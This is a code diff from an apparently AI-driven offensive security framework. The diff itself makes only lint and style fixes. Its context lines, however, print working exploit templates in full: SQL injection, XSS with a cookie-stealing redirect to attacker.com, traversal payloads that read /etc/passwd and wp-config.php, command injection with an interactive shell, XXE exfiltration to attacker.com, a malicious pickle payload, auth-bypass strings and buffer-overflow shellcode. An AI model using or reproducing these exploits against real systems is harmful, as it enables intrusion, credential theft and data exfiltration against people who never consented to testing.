@@ -50,21 +50,21 @@ from typing import List, Set
 from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
 try:
-    import selenium
+    import selenium  # noqa: F401
     from selenium import webdriver
     from selenium.webdriver.chrome.options import Options as SeleniumOptions
     from selenium.webdriver.common.by import By
-    from selenium.webdriver.support.ui import WebDriverWait
-    from selenium.webdriver.support import expected_conditions as EC
-    from selenium.common.exceptions import TimeoutException, WebDriverException
+    from selenium.webdriver.support.ui import WebDriverWait  # noqa: F401
+    from selenium.webdriver.support import expected_conditions as EC  # noqa: F401
+    from selenium.common.exceptions import TimeoutException, WebDriverException  # noqa: F401
     HAS_SELENIUM = True
 except ImportError:
     HAS_SELENIUM = False
 try:
-    import mitmproxy
-    from mitmproxy import http as mitmhttp
-    from mitmproxy.tools.dump import DumpMaster
-    from mitmproxy.options import Options as MitmOptions
+    import mitmproxy  # noqa: F401
+    from mitmproxy import http as mitmhttp  # noqa: F401
+    from mitmproxy.tools.dump import DumpMaster  # noqa: F401
+    from mitmproxy.options import Options as MitmOptions  # noqa: F401
     HAS_MITMPROXY = True
 except ImportError:
     HAS_MITMPROXY = False
@@ -1629,8 +1629,8 @@ decision_engine = IntelligentDecisionEngine()
 # INTELLIGENT ERROR HANDLING AND RECOVERY SYSTEM (v11.0 ENHANCEMENT)
 # ============================================================================
 
-from enum import Enum
-from dataclasses import dataclass
+from enum import Enum  # noqa: E402
+from dataclasses import dataclass  # noqa: E402
 
 class ErrorType(Enum):
     """Enumeration of different error types for intelligent handling"""
@@ -4012,7 +4012,7 @@ class CTFChallengeAutomator:
         for tool in tools:
             try:
                 if tool != "manual":
-                    command = ctf_tools.get_tool_command(tool, challenge.target or challenge.name)
+                    _command = ctf_tools.get_tool_command(tool, challenge.target or challenge.name)
                     # In a real implementation, this would execute the command
                     step_result["tools_used"].append(tool)
                     step_result["output"] += f"[{tool}] Executed successfully\n"
@@ -5851,19 +5851,23 @@ class CVEIntelligenceManager:
 
         # Style-specific rendering
         if style == 'cyber':
-            filled_char = '█'; empty_char = '░'
+            filled_char = '█'
+            empty_char = '░'
             bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
             progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
         elif style == 'matrix':
-            filled_char = '▓'; empty_char = '▒'
+            filled_char = '▓'
+            empty_char = '▒'
             bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
             progress_color = ModernVisualEngine.COLORS['ACCENT_GRADIENT']
         elif style == 'neon':
-            filled_char = '━'; empty_char = '─'
+            filled_char = '━'
+            empty_char = '─'
             bar_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
             progress_color = ModernVisualEngine.COLORS['CYBER_ORANGE']
         else:
-            filled_char = '█'; empty_char = '░'
+            filled_char = '█'
+            empty_char = '░'
             bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
             progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
 
@@ -7472,18 +7476,18 @@ class SQLiExploit:
         self.endpoint = "{endpoint}"
         self.parameter = "{parameter}"
         self.session = requests.Session()
-        
+
     def test_injection(self):
         """Test if target is vulnerable"""
         print(f"[+] Testing SQL injection on {{self.target_url}}{{self.endpoint}}")
-        
+
         # Time-based blind SQL injection test
         payloads = [
             "1' AND SLEEP(3)--",
             "1' OR SLEEP(3)--",
             "1'; WAITFOR DELAY '00:00:03'--"
         ]
-        
+
         for payload in payloads:
             start_time = time.time()
             try:
@@ -7493,69 +7497,69 @@ class SQLiExploit:
                     timeout=10
                 )
                 elapsed = time.time() - start_time
-                
+
                 if elapsed >= 3:
                     print(f"[+] Vulnerable! Payload: {{payload}}")
                     return True
-                    
+
             except requests.exceptions.Timeout:
                 print(f"[+] Likely vulnerable (timeout): {{payload}}")
                 return True
             except Exception as e:
                 continue
-                
+
         return False
-    
+
     def extract_database_info(self):
         """Extract database information"""
         print("[+] Extracting database information...")
-        
+
         queries = {{
             "version": "SELECT VERSION()",
             "user": "SELECT USER()",
             "database": "SELECT DATABASE()"
         }}
-        
+
         results = {{}}
-        
+
         for info_type, query in queries.items():
-            payload = f"1' UNION SELECT 1,({query}),3--"  # noqa: F821
+            payload = f"1' UNION SELECT 1,({query}),3--"  # noqa
             try:
                 response = self.session.get(
                     f"{{self.target_url}}{{self.endpoint}}",
                     params={{self.parameter: payload}}
                 )
-                
+
                 # Simple extraction (would need customization per application)
                 if response.status_code == 200:
                     results[info_type] = "Check response manually"
                     print(f"[+] {{info_type.title()}}: Check response for {{query}}")
-                    
+
             except Exception as e:
                 print(f"[-] Error extracting {{info_type}}: {{e}}")
-                
+
         return results
-    
+
     def dump_tables(self):
         """Dump table names"""
         print("[+] Attempting to dump table names...")
-        
+
         # MySQL/MariaDB
         payload = "1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
-        
+
         try:
             response = self.session.get(
                 f"{{self.target_url}}{{self.endpoint}}",
                 params={{self.parameter: payload}}
             )
-            
+
             if response.status_code == 200:
                 print("[+] Tables dumped - check response")
                 return response.text
-                
+
         except Exception as e:
             print(f"[-] Error dumping tables: {{e}}")
-            
+
         return None
 
 def main():
@@ -7563,13 +7567,13 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
         print(f"Example: python3 {{sys.argv[0]}} http://target.com")
         sys.exit(1)
-    
+
     target_url = sys.argv[1]
     exploit = SQLiExploit(target_url)
-    
+
     print(f"[+] SQL Injection Exploit for {cve_id}")
     print(f"[+] Target: {{target_url}}")
-    
+
     if exploit.test_injection():
         print("[+] Target appears vulnerable!")
         exploit.extract_database_info()
@@ -7599,7 +7603,7 @@ class XSSExploit:
     def __init__(self, target_url):
         self.target_url = target_url.rstrip('/')
         self.session = requests.Session()
-        
+
     def generate_payloads(self):
         """Generate XSS payloads for testing"""
         payloads = [
@@ -7607,48 +7611,48 @@ class XSSExploit:
             "<script>alert('XSS-{cve_id}')</script>",
             "<img src=x onerror=alert('XSS-{cve_id}')>",
             "<svg onload=alert('XSS-{cve_id}')>",
-            
+
             # Bypass attempts
             "<script>alert(String.fromCharCode(88,83,83))</script>",
             "javascript:alert('XSS-{cve_id}')",
             "<iframe src=javascript:alert('XSS-{cve_id}')></iframe>",
-            
+
             # Advanced payloads
             "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d.substr(0,100)))</script>",
             "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
         ]
-        
+
         return payloads
-    
+
     def test_reflected_xss(self, parameter="q"):
         """Test for reflected XSS"""
         print(f"[+] Testing reflected XSS on parameter: {{parameter}}")
-        
+
         payloads = self.generate_payloads()
-        
+
         for i, payload in enumerate(payloads):
             try:
                 response = self.session.get(
                     self.target_url,
                     params={{parameter: payload}}
                 )
-                
+
                 if payload in response.text:
                     print(f"[+] Potential XSS found with payload {{i+1}}: {{payload[:50]}}...")
                     return True
-                    
+
             except Exception as e:
                 print(f"[-] Error testing payload {{i+1}}: {{e}}")
                 continue
-                
+
         return False
-    
+
     def test_stored_xss(self, endpoint="/comment", data_param="comment"):
         """Test for stored XSS"""
         print(f"[+] Testing stored XSS on endpoint: {{endpoint}}")
-        
+
         payloads = self.generate_payloads()
-        
+
         for i, payload in enumerate(payloads):
             try:
                 # Submit payload
@@ -7656,17 +7660,17 @@ class XSSExploit:
                     f"{{self.target_url}}{{endpoint}}",
                     data={{data_param: payload}}
                 )
-                
+
                 # Check if stored
                 check_response = self.session.get(self.target_url)
                 if payload in check_response.text:
                     print(f"[+] Stored XSS found with payload {{i+1}}: {{payload[:50]}}...")
                     return True
-                    
+
             except Exception as e:
                 print(f"[-] Error testing stored payload {{i+1}}: {{e}}")
                 continue
-                
+
         return False
 
 def main():
@@ -7674,21 +7678,21 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter]")
         print(f"Example: python3 {{sys.argv[0]}} http://target.com/search q")
         sys.exit(1)
-    
+
     target_url = sys.argv[1]
     parameter = sys.argv[2] if len(sys.argv) > 2 else "q"
-    
+
     exploit = XSSExploit(target_url)
-    
+
     print(f"[+] XSS Exploit for {cve_id}")
     print(f"[+] Target: {{target_url}}")
-    
+
     if "{xss_type}" == "reflected" or "{xss_type}" == "unknown":
         if exploit.test_reflected_xss(parameter):
             print("[+] Reflected XSS vulnerability confirmed!")
         else:
             print("[-] No reflected XSS found")
-    
+
     if "{xss_type}" == "stored" or "{xss_type}" == "unknown":
         if exploit.test_stored_xss():
             print("[+] Stored XSS vulnerability confirmed!")
@@ -7719,42 +7723,42 @@ class FileReadExploit:
     def __init__(self, target_url):
         self.target_url = target_url.rstrip('/')
         self.session = requests.Session()
-        
+
     def generate_payloads(self, target_file="/etc/passwd"):
         """Generate directory traversal payloads"""
         payloads = [
             # Basic traversal
             "../" * 10 + target_file.lstrip('/'),
             "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
-            
+
             # URL encoded
             quote("../") * 10 + target_file.lstrip('/'),
-            
+
             # Double encoding
             quote(quote("../")) * 10 + target_file.lstrip('/'),
-            
+
             # Null byte (for older systems)
             "../" * 10 + target_file.lstrip('/') + "%00.txt",
-            
+
             # Absolute paths
             target_file,
             "file://" + target_file,
-            
+
             # Windows paths
             "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
             "C:/windows/system32/drivers/etc/hosts"
         ]
-        
+
         return payloads
-    
+
     def test_file_read(self, parameter="{parameter}"):
         """Test LFI vulnerability on WordPress"""
         print(f"[+] Testing LFI on parameter: {{parameter}}")
-        
+
         # WordPress-specific files and common targets
         test_files = [
             "/etc/passwd",
-            "/etc/hosts", 
+            "/etc/hosts",
             "/proc/version",
             "/var/www/html/wp-config.php",
             "/var/log/apache2/access.log",
@@ -7762,17 +7766,17 @@ class FileReadExploit:
             "../../../../etc/passwd",
             "php://filter/convert.base64-encode/resource=wp-config.php"
         ]
-        
+
         for target_file in test_files:
             payloads = self.generate_payloads(target_file)
-            
+
             for i, payload in enumerate(payloads):
                 try:
                     response = self.session.get(
                         self.target_url,
                         params={{parameter: payload}}
                     )
-                    
+
                     # Check for common file contents
                     indicators = [
                         "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
@@ -7780,42 +7784,42 @@ class FileReadExploit:
                         "Linux version", "Microsoft Windows",  # system info
                         "<?php", "#!/bin/"  # code files
                     ]
-                    
+
                     if any(indicator in response.text for indicator in indicators):
                         print(f"[+] File read successful!")
                         print(f"[+] File: {{target_file}}")
                         print(f"[+] Payload: {{payload}}")
                         print(f"[+] Content preview: {{response.text[:200]}}...")
                         return True
-                        
+
                 except Exception as e:
                     continue
-                    
+
         return False
-    
+
     def read_specific_file(self, filepath, parameter="file"):
         """Read a specific file"""
         print(f"[+] Attempting to read: {{filepath}}")
-        
+
         payloads = self.generate_payloads(filepath)
-        
+
         for payload in payloads:
             try:
                 response = self.session.get(
                     self.target_url,
                     params={{parameter: payload}}
                 )
-                
+
                 if response.status_code == 200 and len(response.text) > 10:
                     print(f"[+] Successfully read {{filepath}}:")
                     print("-" * 50)
                     print(response.text)
                     print("-" * 50)
                     return response.text
-                    
+
             except Exception as e:
                 continue
-                
+
         print(f"[-] Could not read {{filepath}}")
         return None
 
@@ -7824,16 +7828,16 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter] [file_to_read]")
         print(f"Example: python3 {{sys.argv[0]}} http://target.com/view file /etc/passwd")
         sys.exit(1)
-    
+
     target_url = sys.argv[1]
     parameter = sys.argv[2] if len(sys.argv) > 2 else "file"
     specific_file = sys.argv[3] if len(sys.argv) > 3 else None
-    
+
     exploit = FileReadExploit(target_url)
-    
+
     print(f"[+] File Read Exploit for {cve_id}")
     print(f"[+] Target: {{target_url}}")
-    
+
     if specific_file:
         exploit.read_specific_file(specific_file, parameter)
     else:
@@ -7865,41 +7869,41 @@ class GenericExploit:
         self.target_url = target_url.rstrip('/')
         self.session = requests.Session()
         self.cve_id = "{cve_id}"
-        
+
     def analyze_target(self):
         """Analyze target for vulnerability indicators"""
         print(f"[+] Analyzing target for {cve_id}")
-        
+
         try:
             response = self.session.get(self.target_url)
-            
+
             # Look for version indicators in response
             headers = response.headers
             content = response.text.lower()
-            
+
             print(f"[+] Server: {{headers.get('Server', 'Unknown')}}")
             print(f"[+] Status Code: {{response.status_code}}")
-            
+
             # Check for software indicators
             software_indicators = [
                 "{details.get('software', '').lower()}",
                 "version {details.get('version', '')}",
             ]
-            
+
             for indicator in software_indicators:
                 if indicator and indicator in content:
                     print(f"[+] Found software indicator: {{indicator}}")
                     return True
-                    
+
         except Exception as e:
             print(f"[-] Error analyzing target: {{e}}")
-            
+
         return False
-    
+
     def test_vulnerability(self):
         """Test for vulnerability presence"""
         print(f"[+] Testing for {cve_id} vulnerability...")
-        
+
         # Based on CVE description, generate test cases
         test_endpoints = [
             "/",
@@ -7907,29 +7911,29 @@ class GenericExploit:
             "/api",
             "/login"
         ]
-        
+
         for endpoint in test_endpoints:
             try:
                 response = self.session.get(f"{{self.target_url}}{{endpoint}}")
                 print(f"[+] {{endpoint}}: {{response.status_code}}")
-                
+
                 # Look for error messages or indicators
                 if response.status_code in [200, 500, 403]:
                     print(f"[+] Endpoint {{endpoint}} accessible")
-                    
+
             except Exception as e:
                 continue
-                
+
         return True
-    
+
     def exploit(self):
         """Attempt exploitation based on CVE details"""
         print(f"[+] Attempting exploitation of {cve_id}")
-        
+
         # This would be customized based on the specific CVE
         print(f"[!] Manual exploitation required for {cve_id}")
         print(f"[!] Vulnerability details: {{'{description[:200]}...'}}")
-        
+
         return False
 
 def main():
@@ -7937,13 +7941,13 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
         print(f"Example: python3 {{sys.argv[0]}} http://target.com")
         sys.exit(1)
-    
+
     target_url = sys.argv[1]
     exploit = GenericExploit(target_url)
-    
+
     print(f"[+] Generic Exploit for {cve_id}")
     print(f"[+] Target: {{target_url}}")
-    
+
     if exploit.analyze_target():
         print("[+] Target may be vulnerable")
         exploit.test_vulnerability()
@@ -8042,11 +8046,11 @@ class RCEExploit:
     def __init__(self, target_url):
         self.target_url = target_url.rstrip('/')
         self.session = requests.Session()
-        
+
     def test_rce(self, command="id"):
         """Test for RCE vulnerability"""
         print(f"[+] Testing RCE with command: {{command}}")
-        
+
         # Common RCE payloads
         payloads = [
             # Command injection
@@ -8054,19 +8058,19 @@ class RCEExploit:
             f"| {{command}}",
             f"&& {{command}}",
             f"|| {{command}}",
-            
+
             # Template injection
             f"${{{{{{command}}}}}}",
             f"{{{{{{command}}}}}}",
-            
+
             # Deserialization payloads
             f"{{command}}",
-            
+
             # OS command injection
             f"`{{command}}`",
             f"$({{command}})",
         ]
-        
+
         for i, payload in enumerate(payloads):
             try:
                 # Test GET parameters
@@ -8074,27 +8078,27 @@ class RCEExploit:
                     self.target_url,
                     params={{"cmd": payload, "exec": payload, "system": payload}}
                 )
-                
+
                 # Look for command output indicators
                 if self._check_rce_indicators(response.text, command):
                     print(f"[+] RCE found with payload {{i+1}}: {{payload}}")
                     return True
-                
+
                 # Test POST data
                 response = self.session.post(
                     self.target_url,
                     data={{"cmd": payload, "exec": payload, "system": payload}}
                 )
-                
+
                 if self._check_rce_indicators(response.text, command):
                     print(f"[+] RCE found with POST payload {{i+1}}: {{payload}}")
                     return True
-                    
+
             except Exception as e:
                 continue
-                
+
         return False
-    
+
     def _check_rce_indicators(self, response_text, command):
         """Check response for RCE indicators"""
         if command == "id":
@@ -8105,13 +8109,13 @@ class RCEExploit:
             indicators = ["/", "\\\\", "C:"]
         else:
             indicators = [command]
-            
+
         return any(indicator in response_text for indicator in indicators)
-    
+
     def execute_command(self, command):
         """Execute a specific command"""
         print(f"[+] Executing command: {{command}}")
-        
+
         if self.test_rce(command):
             print(f"[+] Command executed successfully")
             return True
@@ -8124,18 +8128,18 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_url> [command]")
         print(f"Example: python3 {{sys.argv[0]}} http://target.com id")
         sys.exit(1)
-    
+
     target_url = sys.argv[1]
     command = sys.argv[2] if len(sys.argv) > 2 else "id"
-    
+
     exploit = RCEExploit(target_url)
-    
+
     print(f"[+] RCE Exploit for {cve_id}")
     print(f"[+] Target: {{target_url}}")
-    
+
     if exploit.test_rce(command):
         print("[+] RCE vulnerability confirmed!")
-        
+
         # Interactive shell
         while True:
             try:
@@ -8168,31 +8172,31 @@ class XXEExploit:
     def __init__(self, target_url):
         self.target_url = target_url.rstrip('/')
         self.session = requests.Session()
-        
+
     def generate_xxe_payloads(self):
         """Generate XXE payloads"""
         payloads = [
             # Basic file read
             '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\\n<root>&xxe;</root>',
-            
+
             # Windows file read
             '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\\n<root>&xxe;</root>',
-            
+
             # HTTP request (SSRF)
             '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\\n<root>&xxe;</root>',
-            
+
             # Parameter entity
             '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [\\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \\'http://attacker.com/?%xxe;\\'>">\\n%param1;\\n]>\\n<root>&exfil;</root>'
         ]
-        
+
         return payloads
-    
+
     def test_xxe(self):
         """Test for XXE vulnerability"""
         print("[+] Testing XXE vulnerability...")
-        
+
         payloads = self.generate_xxe_payloads()
-        
+
         for i, payload in enumerate(payloads):
             try:
                 headers = {{"Content-Type": "application/xml"}}
@@ -8201,22 +8205,22 @@ class XXEExploit:
                     data=payload,
                     headers=headers
                 )
-                
+
                 # Check for file content indicators
                 indicators = [
                     "root:", "daemon:", "bin:",  # /etc/passwd
                     "localhost", "127.0.0.1",   # hosts file
                     "<?xml", "<!DOCTYPE"        # XML processing
                 ]
-                
+
                 if any(indicator in response.text for indicator in indicators):
                     print(f"[+] XXE vulnerability found with payload {{i+1}}")
                     print(f"[+] Response: {{response.text[:200]}}...")
                     return True
-                    
+
             except Exception as e:
                 continue
-                
+
         return False
 
 def main():
@@ -8224,13 +8228,13 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
         print(f"Example: python3 {{sys.argv[0]}} http://target.com/xml")
         sys.exit(1)
-    
+
     target_url = sys.argv[1]
     exploit = XXEExploit(target_url)
-    
+
     print(f"[+] XXE Exploit for {cve_id}")
     print(f"[+] Target: {{target_url}}")
-    
+
     if exploit.test_xxe():
         print("[+] XXE vulnerability confirmed!")
     else:
@@ -8258,51 +8262,51 @@ class DeserializationExploit:
     def __init__(self, target_url):
         self.target_url = target_url.rstrip('/')
         self.session = requests.Session()
-        
+
     def create_pickle_payload(self, command):
         """Create malicious pickle payload"""
         class ExploitPayload:
             def __reduce__(self):
                 import subprocess
                 return (subprocess.call, ([command], ))
-        
+
         payload = ExploitPayload()
         serialized = pickle.dumps(payload)
         encoded = base64.b64encode(serialized).decode()
         return encoded
-    
+
     def test_deserialization(self):
         """Test for deserialization vulnerabilities"""
         print("[+] Testing deserialization vulnerability...")
-        
+
         test_command = "ping -c 1 127.0.0.1"  # Safe test command
-        
+
         # Test different serialization formats
         payloads = {{
             "pickle": self.create_pickle_payload(test_command),
             "json": json.dumps({{"__type__": "os.system", "command": test_command}}),
             "java": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"
         }}
-        
+
         for format_type, payload in payloads.items():
             try:
                 # Test different parameters
                 test_params = ["data", "payload", "object", "serialized"]
-                
+
                 for param in test_params:
                     response = self.session.post(
                         self.target_url,
                         data={{param: payload}}
                     )
-                    
+
                     # Check for deserialization indicators
                     if response.status_code in [200, 500] and len(response.text) > 0:
                         print(f"[+] Potential {{format_type}} deserialization found")
                         return True
-                        
+
             except Exception as e:
                 continue
-                
+
         return False
 
 def main():
@@ -8310,13 +8314,13 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
         print(f"Example: python3 {{sys.argv[0]}} http://target.com/deserialize")
         sys.exit(1)
-    
+
     target_url = sys.argv[1]
     exploit = DeserializationExploit(target_url)
-    
+
     print(f"[+] Deserialization Exploit for {cve_id}")
     print(f"[+] Target: {{target_url}}")
-    
+
     if exploit.test_deserialization():
         print("[+] Deserialization vulnerability confirmed!")
     else:
@@ -8341,11 +8345,11 @@ class AuthBypassExploit:
     def __init__(self, target_url):
         self.target_url = target_url.rstrip('/')
         self.session = requests.Session()
-        
+
     def test_sql_auth_bypass(self):
         """Test SQL injection authentication bypass"""
         print("[+] Testing SQL injection auth bypass...")
-        
+
         bypass_payloads = [
             "admin' --",
             "admin' #",
@@ -8355,38 +8359,38 @@ class AuthBypassExploit:
             "') or '1'='1--",
             "admin' or '1'='1",
         ]
-        
+
         for payload in bypass_payloads:
             try:
                 data = {{
                     "username": payload,
                     "password": "anything"
                 }}
-                
+
                 response = self.session.post(
                     f"{{self.target_url}}/login",
                     data=data
                 )
-                
+
                 # Check for successful login indicators
                 success_indicators = [
                     "dashboard", "welcome", "logout", "admin panel",
                     "successful", "redirect"
                 ]
-                
+
                 if any(indicator in response.text.lower() for indicator in success_indicators):
                     print(f"[+] SQL injection bypass successful: {{payload}}")
                     return True
-                    
+
             except Exception as e:
                 continue
-                
+
         return False
-    
+
     def test_header_bypass(self):
         """Test header-based authentication bypass"""
         print("[+] Testing header-based auth bypass...")
-        
+
         bypass_headers = [
             {{"X-Forwarded-For": "127.0.0.1"}},
             {{"X-Real-IP": "127.0.0.1"}},
@@ -8394,21 +8398,21 @@ class AuthBypassExploit:
             {{"X-Forwarded-User": "admin"}},
             {{"Authorization": "Bearer admin"}},
         ]
-        
+
         for headers in bypass_headers:
             try:
                 response = self.session.get(
                     f"{{self.target_url}}/admin",
                     headers=headers
                 )
-                
+
                 if response.status_code == 200:
                     print(f"[+] Header bypass successful: {{headers}}")
                     return True
-                    
+
             except Exception as e:
                 continue
-                
+
         return False
 
 def main():
@@ -8416,22 +8420,22 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
         print(f"Example: python3 {{sys.argv[0]}} http://target.com")
         sys.exit(1)
-    
+
     target_url = sys.argv[1]
     exploit = AuthBypassExploit(target_url)
-    
+
     print(f"[+] Authentication Bypass Exploit for {cve_id}")
     print(f"[+] Target: {{target_url}}")
-    
+
     success = False
     if exploit.test_sql_auth_bypass():
         print("[+] SQL injection authentication bypass confirmed!")
         success = True
-        
+
     if exploit.test_header_bypass():
         print("[+] Header-based authentication bypass confirmed!")
         success = True
-        
+
     if not success:
         print("[-] No authentication bypass found")
 
@@ -8457,14 +8461,14 @@ class BufferOverflowExploit:
     def __init__(self, target_host, target_port):
         self.target_host = target_host
         self.target_port = int(target_port)
-        
+
     def create_pattern(self, length):
         """Create cyclic pattern for offset discovery"""
         pattern = ""
         for i in range(length):
             pattern += chr(65 + (i % 26))  # A-Z pattern
         return pattern
-    
+
     def generate_shellcode(self):
         """Generate shellcode for {arch}"""
         if "{arch}" == "x86":
@@ -8479,56 +8483,56 @@ class BufferOverflowExploit:
                 "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
                 "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
             )
-        
+
         return shellcode.encode('latin-1')
-    
+
     def create_exploit(self, offset=140):
         """Create buffer overflow exploit"""
         print(f"[+] Creating buffer overflow exploit...")
         print(f"[+] Offset: {{offset}} bytes")
-        
+
         # Pattern to reach return address
         padding = "A" * offset
-        
+
         if "{arch}" == "x86":
             # x86 return address (example)
             ret_addr = struct.pack("<I", 0x08048080)  # Adjust for target
         else:
             # x64 return address (example)
             ret_addr = struct.pack("<Q", 0x0000000000401000)  # Adjust for target
-        
+
         # NOP sled
         nop_sled = "\\x90" * 16
-        
+
         # Shellcode
         shellcode = self.generate_shellcode()
-        
+
         exploit = padding.encode() + ret_addr + nop_sled.encode('latin-1') + shellcode
-        
+
         print(f"[+] Exploit size: {{len(exploit)}} bytes")
         return exploit
-    
+
     def send_exploit(self, payload):
         """Send exploit to target"""
         try:
             print(f"[+] Connecting to {{self.target_host}}:{{self.target_port}}")
-            
+
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.target_host, self.target_port))
-            
+
             print("[+] Sending exploit...")
             sock.send(payload)
-            
+
             # Try to interact
             try:
                 response = sock.recv(1024)
                 print(f"[+] Response: {{response}}")
             except:
                 pass
-                
+
             sock.close()
             print("[+] Exploit sent successfully")
-            
+
         except Exception as e:
             print(f"[-] Error: {{e}}")
 
@@ -8537,16 +8541,16 @@ def main():
         print(f"Usage: python3 {{sys.argv[0]}} <target_host> <target_port>")
         print(f"Example: python3 {{sys.argv[0]}} 192.168.1.100 9999")
         sys.exit(1)
-    
+
     target_host = sys.argv[1]
     target_port = sys.argv[2]
-    
+
     exploit = BufferOverflowExploit(target_host, target_port)
-    
+
     print(f"[+] Buffer Overflow Exploit for {cve_id}")
     print(f"[+] Target: {{target_host}}:{{target_port}}")
     print(f"[+] Architecture: {arch}")
-    
+
     # Create and send exploit
     payload = exploit.create_exploit()
     exploit.send_exploit(payload)
@@ -12082,7 +12086,7 @@ def gdb():
         if commands and os.path.exists("/tmp/gdb_commands.txt"):
             try:
                 os.remove("/tmp/gdb_commands.txt")
-            except:
+            except Exception:
                 pass
 
         logger.info(f"📊 GDB analysis completed for {binary}")
@@ -12125,7 +12129,7 @@ def radare2():
         if commands and os.path.exists("/tmp/r2_commands.txt"):
             try:
                 os.remove("/tmp/r2_commands.txt")
-            except:
+            except Exception:
                 pass
 
         logger.info(f"📊 Radare2 analysis completed for {binary}")
@@ -12444,7 +12448,7 @@ p.interactive()
         # Cleanup
         try:
             os.remove(script_file)
-        except:
+        except Exception:
             pass
 
         logger.info("📊 Pwntools exploit completed")
@@ -12573,7 +12577,7 @@ quit
         if commands and os.path.exists("/tmp/gdb_peda_commands.txt"):
             try:
                 os.remove("/tmp/gdb_peda_commands.txt")
-            except:
+            except Exception:
                 pass
 
         logger.info("📊 GDB-PEDA analysis completed")
@@ -12664,7 +12668,7 @@ for func_addr, func in cfg.functions.items():
         # Cleanup
         try:
             os.remove(script_file)
-        except:
+        except Exception:
             pass
 
         logger.info("📊 angr analysis completed")
@@ -13889,15 +13893,18 @@ class BrowserAgent:
         # Cookies
         cookie_issues = self._analyze_cookies(page_info.get('cookies', []))
         if cookie_issues:
-            issues.extend(cookie_issues); modules.append('cookie_analysis')
+            issues.extend(cookie_issues)
+            modules.append('cookie_analysis')
         # Headers
         header_issues = self._analyze_security_headers(page_source, page_info)
         if header_issues:
-            issues.extend(header_issues); modules.append('security_headers')
+            issues.extend(header_issues)
+            modules.append('security_headers')
         # Mixed content
         mixed = self._detect_mixed_content(page_info)
         if mixed:
-            issues.extend(mixed); modules.append('mixed_content')
+            issues.extend(mixed)
+            modules.append('mixed_content')
         # Console errors may hint at DOM XSS sinks
         if page_info.get('console_errors'):
             modules.append('console_log_capture')
@@ -13949,7 +13956,7 @@ class BrowserAgent:
                 }
                 return storage;
             """)
-        except:
+        except Exception:
             return {}
 
     def _get_session_storage(self) -> dict:
@@ -13963,7 +13970,7 @@ class BrowserAgent:
                 }
                 return storage;
             """)
-        except:
+        except Exception:
             return {}
 
     def _extract_forms(self) -> list:
@@ -13987,7 +13994,7 @@ class BrowserAgent:
                     })
 
                 forms.append(form_data)
-        except:
+        except Exception:
             pass
 
         return forms
@@ -14004,7 +14011,7 @@ class BrowserAgent:
                         'href': href,
                         'text': link.text[:100]  # Limit text length
                     })
-        except:
+        except Exception:
             pass
 
         return links
@@ -14021,7 +14028,7 @@ class BrowserAgent:
                     'id': input_elem.get_attribute('id') or '',
                     'placeholder': input_elem.get_attribute('placeholder') or ''
                 })
-        except:
+        except Exception:
             pass
 
         return inputs
@@ -14042,7 +14049,7 @@ class BrowserAgent:
                             'type': 'inline',
                             'content': content[:1000]  # Limit content
                         })
-        except:
+        except Exception:
             pass
 
         return scripts
@@ -14065,7 +14072,7 @@ class BrowserAgent:
                     })
 
             return network_requests
-        except:
+        except Exception:
             return []
 
     def _analyze_page_security(self, page_source: str, page_info: dict) -> dict:
@@ -14990,7 +14997,7 @@ def graphql_scanner():
         endpoint = params.get("endpoint", "")
         introspection = params.get("introspection", True)
         query_depth = params.get("query_depth", 10)
-        mutations = params.get("test_mutations", True)
+        _mutations = params.get("test_mutations", True)
 
         if not endpoint:
             logger.warning("🌐 GraphQL Scanner called without endpoint parameter")
@@ -15753,7 +15760,7 @@ def discover_attack_chains():
 
                             if exploit_result.get("success"):
                                 enhanced_stage["exploit_code"] = exploit_result.get("exploit_code", "")[:500] + "..."
-                        except:
+                        except Exception:
                             enhanced_stage["exploit_available"] = False
 
                     enhanced_stages.append(enhanced_stage)
@@ -16340,7 +16347,7 @@ def suggest_ctf_tools():
         for tool in suggested_tools:
             try:
                 tool_commands[tool] = ctf_tools.get_tool_command(tool, "TARGET")
-            except:
+            except Exception:
